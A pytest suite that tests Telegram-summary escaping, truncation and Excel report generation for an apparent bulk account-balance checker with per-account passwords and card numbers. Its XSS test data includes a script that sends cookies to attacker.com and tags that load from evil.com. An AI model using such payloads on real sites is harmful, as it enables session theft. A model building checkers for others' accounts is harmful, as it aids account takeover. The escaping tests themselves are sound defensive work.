# -*- coding: utf-8 -*-
"""
Milestone M3.2 Adversarial Recheck Test Suite
Focus: Empirical stress testing of:
1. format_telegram_summary: massive lists (>100 items or >4000 chars),
   XSS injection attempts (<script>, <a href="...">, unclosed tags, raw entities),
   strict HTML escaping and 4000-character truncation limit.
2. generate_consolidated_excel: extreme row data (None, NaN, numeric types, huge strings, emojis),
   6-sheet creation, openpyxl loadability without corruption, row conservation,
   and mutual exclusivity.
"""

import math
import os
import re
import numpy as np
import openpyxl
import pandas as pd
import pytest

from scripts.merge_and_retry import (
    format_telegram_summary,
    generate_consolidated_excel,
    limpiar_saldo,
)
from tests.test_adversarial_m3 import TelegramHTMLOracle


# ==============================================================================
# 1. format_telegram_summary Adversarial Stress Tests
# ==============================================================================

class TestTelegramSummaryAdversarialM32:
    """Empirical adversarial stress testing of format_telegram_summary."""

    def test_massive_top10_list_truncation_under_4000_chars(self):
        """
        Stress test format_telegram_summary with a massive list of >100 items.
        Verify that:
        1. Result is truncated.
        2. Result length is strictly <= 4000 characters.
        3. Result length <= 4096 (Telegram absolute hard limit).
        4. Suffix '... [truncado]' is appended.
        """
        massive_top = [
            (float(i), f"user_{i:04d}_with_a_rather_long_email_address_domain@corporate.alcampo.es", "p", "c")
            for i in range(150)
        ]
        msg = format_telegram_summary(
            total=150,
            saldo_total=11175.0,
            cuentas_dinero=150,
            cuentas_cero=0,
            cuentas_error=0,
            top_10=massive_top,
        )

        assert len(msg) <= 4000, f"Expected length <= 4000, got {len(msg)}"
        assert len(msg) <= 4096, f"Exceeds Telegram 4096 limit: {len(msg)}"
        assert "... [truncado]" in msg
        assert "📊 <b>RESUMEN CONSOLIDADO FINAL (2 PASADAS MATRIZ)</b>" in msg

        # Telegram HTML validity check
        violations = TelegramHTMLOracle.validate(msg)
        # Verify no unclosed tags
        tag_violations = [v for v in violations if "Unclosed tags" in v or "Disallowed HTML" in v]
        assert tag_violations == [], f"Found HTML structure violations: {tag_violations}"

    def test_xss_script_tags_in_emails_and_error_summary(self):
        """
        Adversarial payloads: <script>alert(1)</script>, <script src='...'>
        Verify strict escaping: &lt;script&gt;, no raw <script> in message.
        """
        xss_emails = [
            (100.0, "<script>alert('XSS')</script>@test.com", "p1", "c1"),
            (50.0, "<SCRIPT SRC='http://evil.com/xss.js'></SCRIPT>@domain.es", "p2", "c2"),
            (25.0, "normal@alcampo.es<script>", "p3", "c3"),
        ]
        xss_error_summary = "<script type='text/javascript'>document.location='http://attacker.com/?cookie='+document.cookie;</script>"

        msg = format_telegram_summary(
            total=3,
            saldo_total=175.0,
            cuentas_dinero=3,
            cuentas_cero=0,
            cuentas_error=1,
            top_10=xss_emails,
            error_summary=xss_error_summary,
        )

        assert "<script" not in msg.lower()
        assert "</script>" not in msg.lower()
        assert "&lt;script&gt;" in msg.lower() or "&lt;script src=" in msg.lower()
        assert TelegramHTMLOracle.validate(msg) == []

    def test_xss_link_and_href_injection_attempts(self):
        """
        Adversarial payloads attempting to inject clickable phishing links
        via <a href="javascript:..."> or <a href="http://malicious.com">.
        Verify <a href is strictly escaped to &lt;a href...
        """
        link_payloads = [
            (99.9, '<a href="javascript:alert(1)">Click to verify</a>', "p", "c"),
            (88.8, '<a href="https://phishing-alcampo.com/login">Re-login</a>', "p", "c"),
            (77.7, '<A HREF="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Exploit</A>', "p", "c"),
        ]
        link_error_summary = 'Check link: <a href="http://attacker.com">Download Patch</a>'

        msg = format_telegram_summary(
            total=3,
            saldo_total=266.4,
            cuentas_dinero=3,
            cuentas_cero=0,
            cuentas_error=1,
            top_10=link_payloads,
            error_summary=link_error_summary,
        )

        assert "<a href" not in msg.lower()
        assert "<a " not in msg.lower()
        assert "&lt;a href" in msg.lower() or "&lt;a " in msg.lower()
        assert TelegramHTMLOracle.validate(msg) == []

    def test_unclosed_and_disallowed_html_tags(self):
        """
        Adversarial payloads with malformed / unclosed tags:
        <b style="...", <img src=x onerror=..., <iframe, <style>, <form action=...>
        """
        malformed_emails = [
            (50.0, '<img src="invalid" onerror="alert(document.domain)">', "p", "c"),
            (40.0, '<iframe src="http://evil.com" onload="alert(1)">', "p", "c"),
            (30.0, '<style>body { display:none; }</style>', "p", "c"),
            (20.0, '<form action="http://evil.com/steal"><input name="user">', "p", "c"),
            (10.0, '<b unclosed_bold_tag_without_closing', "p", "c"),
        ]
        malformed_summary = '<div class="alert alert-danger" <span id="leak">Unclosed tags everywhere'

        msg = format_telegram_summary(
            total=5,
            saldo_total=150.0,
            cuentas_dinero=5,
            cuentas_cero=0,
            cuentas_error=1,
            top_10=malformed_emails,
            error_summary=malformed_summary,
        )

        # No raw unescaped disallowed tags
        for disallowed in ["<img", "<iframe", "<style", "<form", "<input", "<b ", "<div", "<span"]:
            assert disallowed not in msg.lower(), f"Raw tag found: {disallowed}"

        violations = TelegramHTMLOracle.validate(msg)
        assert violations == [], f"TelegramHTMLOracle violations: {violations}"

    def test_raw_entities_and_special_characters(self):
        """
        Test emails and error summaries with raw &, <, >, \", ' and unicode.
        """
        special_top = [
            (12.34, "user&partner<special>@alcampo.es", "p", "c"),
            (56.78, '"quoted_user"@domain.com', "p", "c"),
            (90.12, "café_ñandú_ünicøde@mercado.es", "p", "c"),
        ]
        special_summary = "Errors occurred on 3 accounts: &, <, >, ' and \" encountered."

        msg = format_telegram_summary(
            total=3,
            saldo_total=159.24,
            cuentas_dinero=3,
            cuentas_cero=0,
            cuentas_error=0,
            top_10=special_top,
            error_summary=special_summary,
        )

        assert "user&amp;partner&lt;special&gt;@alcampo.es" in msg
        violations = TelegramHTMLOracle.validate(msg)
        assert violations == [], f"Violations: {violations}"

    def test_non_string_and_falsy_types_in_top10_and_summary(self):
        """
        Stress test with None, NaN, integer, boolean types in top_10 and error_summary.
        """
        mixed_top = [
            (10.0, None, "p", "c"),
            (20.0, 1234567, "p", "c"),
            (30.0, False, "p", "c"),
            (40.0, float("nan"), "p", "c"),
        ]
        # Should not crash with mixed / unusual types
        msg = format_telegram_summary(
            total=4,
            saldo_total=100.0,
            cuentas_dinero=4,
            cuentas_cero=0,
            cuentas_error=0,
            top_10=mixed_top,
            error_summary={"nested": "dict_summary"},
        )
        assert "None" in msg
        assert "1234567" in msg
        assert "False" in msg
        assert "nan" in msg
        assert "{&#x27;nested&#x27;: &#x27;dict_summary&#x27;}" in msg or "{'nested': 'dict_summary'}" in msg or "nested" in msg
        assert len(msg) <= 4096

    def test_massive_error_summary_truncation(self):
        """
        Test with error_summary exceeding 5000 characters.
        Verify final message is truncated to <= 4000 characters.
        """
        huge_summary = "TimeoutError: Operation timed out while awaiting response from gateway. " * 80
        assert len(huge_summary) > 5000

        msg = format_telegram_summary(
            total=10,
            saldo_total=0.0,
            cuentas_dinero=0,
            cuentas_cero=0,
            cuentas_error=10,
            top_10=[],
            error_summary=huge_summary,
        )

        assert len(msg) <= 4000
        assert "... [truncado]" in msg


# ==============================================================================
# 2. generate_consolidated_excel Adversarial Stress Tests
# ==============================================================================

class TestGenerateConsolidatedExcelAdversarialM32:
    """Empirical adversarial stress testing of generate_consolidated_excel."""

    EXPECTED_SHEETS = [
        "Todas las Cuentas",
        "Exitosas con Saldo",
        "Saldo Cero Verificado",
        "Bloqueadas Call Center",
        "Error Credenciales",
        "Error IP y Timeouts",
    ]

    def test_extreme_row_data_none_nan_numeric_huge_strings(self, tmp_path):
        """
        Stress test generate_consolidated_excel with extreme row data:
        - None, np.nan, pd.NA
        - Numeric types in string columns
        - Huge strings (10,000 characters)
        - Unicode, emojis, multiline strings
        - All 6 sheets created
        - Openpyxl successfully writes and re-reads without corruption
        """
        out_excel = tmp_path / "extreme_consolidated.xlsx"

        records = [
            # 1. Success with positive balance, huge causa_error and multiline notes
            {
                "email": "huge_string@alcampo.es",
                "password": "pwd",
                "saldo": "Tu Saldo es 45,50 €",
                "causa_error": "A" * 10000,
                "error_type": None,
                "card_number": "0001000200030004",
            },
            # 2. Success with zero balance
            {
                "email": "zero_balance@alcampo.es",
                "password": "pwd",
                "saldo": "Tu Saldo es 0,00 €",
                "causa_error": np.nan,
                "error_type": "",
                "card_number": 1234567890123456,  # integer card number
            },
            # 3. Call center with emojis and mixed types
            {
                "email": "call_center_emoji@alcampo.es",
                "password": 999999,  # integer password
                "saldo": "⚠️ Cuenta bloqueada. Contacte con Call Center",
                "causa_error": "Call center 🚨 2FA required",
                "error_type": "needs_attention",
                "card_number": None,
            },
            # 4. Credential error with special symbols
            {
                "email": "cred_error@alcampo.es",
                "password": '"><script>',
                "saldo": "Error: Credenciales incorrectas",
                "causa_error": "Usuario o contraseña incorrectos",
                "error_type": "account_error",
                "card_number": np.nan,
            },
            # 5. IP / Timeout error with NaN saldo and float error_type
            {
                "email": "ip_timeout@alcampo.es",
                "password": None,
                "saldo": np.nan,
                "causa_error": "ReadTimeout: HTTPSConnectionPool(host='alcampo.es', port=443)",
                "error_type": "session_error",
                "card_number": None,
            },
            # 6. Account where all attributes except email are None/empty
            {
                "email": "all_none_fields@alcampo.es",
                "password": None,
                "saldo": None,
                "causa_error": None,
                "error_type": None,
                "card_number": None,
            },
            # 7. Row with Unicode characters (accented, Chinese, Arabic)
            {
                "email": "ünicøde_ñ_中文_عربي@domain.com",
                "password": "p",
                "saldo": "Tu Saldo es 12.34 €",
                "causa_error": "Nota: saldo verificado con éxito",
                "error_type": "",
                "card_number": "9999888877776666",
            },
            # 8. Row with unexpected extra columns
            {
                "email": "extra_cols@alcampo.es",
                "password": "p",
                "saldo": "Tu Saldo es 0,00 €",
                "causa_error": "",
                "error_type": "",
                "card_number": "1111",
                "unrelated_debug_col": "should_be_preserved_in_master",
            },
        ]

        df_all = pd.DataFrame(records)

        # Call generate_consolidated_excel
        sheets = generate_consolidated_excel(df_all, str(out_excel))

        # 1. Verify all 6 sheets returned in dictionary
        assert set(sheets.keys()) == set(self.EXPECTED_SHEETS)

        # 2. Verify file was written to disk
        assert os.path.exists(out_excel)
        assert os.path.getsize(out_excel) > 0

        # 3. Verify openpyxl can load and validate the workbook cleanly (no corruption)
        wb = openpyxl.load_workbook(out_excel)
        assert wb.sheetnames == self.EXPECTED_SHEETS
        wb.close()

        # 4. Verify pandas can read all sheets back
        with pd.ExcelFile(out_excel) as xf:
            assert xf.sheet_names == self.EXPECTED_SHEETS
            s_all = pd.read_excel(xf, sheet_name="Todas las Cuentas")
            s_con_saldo = pd.read_excel(xf, sheet_name="Exitosas con Saldo")
            s_saldo_cero = pd.read_excel(xf, sheet_name="Saldo Cero Verificado")
            s_callcenter = pd.read_excel(xf, sheet_name="Bloqueadas Call Center")
            s_cred = pd.read_excel(xf, sheet_name="Error Credenciales")
            s_ipto = pd.read_excel(xf, sheet_name="Error IP y Timeouts")

        # Total accounts: 8
        assert len(s_all) == 8

        # Exitosas con saldo:
        # row 1 (45,50 €) and row 7 (12.34 €) -> 2
        assert len(s_con_saldo) == 2

        # Saldo cero verificado:
        # row 2 (0,00 €) and row 8 (0,00 €) -> 2
        assert len(s_saldo_cero) == 2

        # Bloqueadas call center:
        # row 3 -> 1
        assert len(s_callcenter) == 1

        # Error credenciales:
        # row 4 -> 1
        assert len(s_cred) == 1

        # Error IP y Timeouts:
        # row 5 and row 6 -> 2
        assert len(s_ipto) == 2

        # 5. Row conservation check: sum of 5 categorized sheets == master sheet
        assert len(s_con_saldo) + len(s_saldo_cero) + len(s_callcenter) + len(s_cred) + len(s_ipto) == len(s_all)

        # 6. Temporary evaluation columns must NOT be present in any sheet
        temp_cols = ["_priority", "_saldo_val", "_is_success", "_is_callcenter", "_is_credenciales"]
        for sname, sdf in sheets.items():
            for c in temp_cols:
                assert c not in sdf.columns, f"Temporary column {c} leaked into sheet {sname}"

    def test_completely_empty_dataframe(self, tmp_path):
        """
        Verify that an empty DataFrame (0 rows) writes a valid 6-sheet workbook
        without crashing.
        """
        out_excel = tmp_path / "empty_dataset.xlsx"
        df_empty = pd.DataFrame(columns=["email", "password", "saldo", "causa_error", "error_type", "card_number"])

        sheets = generate_consolidated_excel(df_empty, str(out_excel))

        assert set(sheets.keys()) == set(self.EXPECTED_SHEETS)
        assert os.path.exists(out_excel)

        wb = openpyxl.load_workbook(out_excel)
        assert wb.sheetnames == self.EXPECTED_SHEETS
        wb.close()

        with pd.ExcelFile(out_excel) as xf:
            for sname in self.EXPECTED_SHEETS:
                sdf = pd.read_excel(xf, sheet_name=sname)
                assert len(sdf) == 0

    def test_missing_essential_columns_autofilled(self, tmp_path):
        """
        Verify that if df_all is missing columns (e.g. only 'email' and 'saldo'),
        generate_consolidated_excel gracefully initializes missing columns
        without KeyError.
        """
        out_excel = tmp_path / "missing_cols.xlsx"
        df_minimal = pd.DataFrame([
            {"email": "min1@alcampo.es", "saldo": "Tu Saldo es 10,00 €"},
            {"email": "min2@alcampo.es", "saldo": "Error de conexión"},
        ])

        sheets = generate_consolidated_excel(df_minimal, str(out_excel))
        assert len(sheets["Exitosas con Saldo"]) == 1
        assert len(sheets["Error IP y Timeouts"]) == 1
        assert os.path.exists(out_excel)

        wb = openpyxl.load_workbook(out_excel)
        assert wb.sheetnames == self.EXPECTED_SHEETS
        wb.close()
